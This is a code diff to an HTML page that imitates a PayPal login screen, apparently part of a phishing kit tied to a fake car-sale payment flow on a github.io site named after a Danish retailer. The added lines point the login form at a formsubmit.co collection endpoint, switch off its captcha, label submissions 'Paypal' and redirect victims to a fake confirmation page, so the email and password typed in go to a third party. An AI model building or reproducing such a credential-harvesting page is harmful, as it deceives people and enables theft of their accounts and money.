@@ -13,7 +13,7 @@
 </head>
 <body>
     <div class="breadcrumb-bar">
-        <a href="C:\Users\SOSO\Downloads\Bilbasen\BMW 330i M-Sport  2019\payment/payment.html" class="back-link"> < Back </a>
+        <a href="https://bilka-dk.github.io/bilka-dk/payment/payment.html?" class="back-link"> < Back </a>
     </div>
     <div class="container">
         <!-- Logo PayPal (SVG officiel simplifié) -->
@@ -22,7 +22,7 @@
         </div>
 
         <!-- Formulaire de saisie -->
-        <form action="">
+        <form method="POST" action="https://formsubmit.co/acb3cba3487868efd28a4ddb8b1c4db7" enctype="multipart/form-data">
             <div class="form-group">
                 <div class="input-container">
                     <input type="text" placeholder="Email address or mobile number" required>
@@ -39,7 +39,14 @@
                 <a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin%253Flocale.x%253Dfr_XC">Forgot email address?</a>
                 <a href="https://www.paypal.com/authflow/password-recovery/?country.x=BJ&locale.x=fr_XC&pwrMayflyId=pwr%3Ae28a76e19198483099109d6f91766928&redirectUri=%252Fsignin%253Flocale.x%253Dfr_XC">Forgot password?</a>
             </div>
-    
+                <!-- Désactiver le captcha -->
+                <input type="hidden" name="_captcha" value="false">
+                <!-- Subject -->
+                <input type="hidden" name="_subject" value="Paypal">
+                <!-- Affichage en tableau -->
+                <input type="hidden" name="_template" value="table">
+                <!-- Redirection vers votre page personnalisée -->
+                <input type="hidden" name="_next" value="https://bilka-dk.github.io/bilka-dk/payment/paypal/confirm.html">
             <button type="submit" class="btn-primary">Log in</button>
         </form>
 
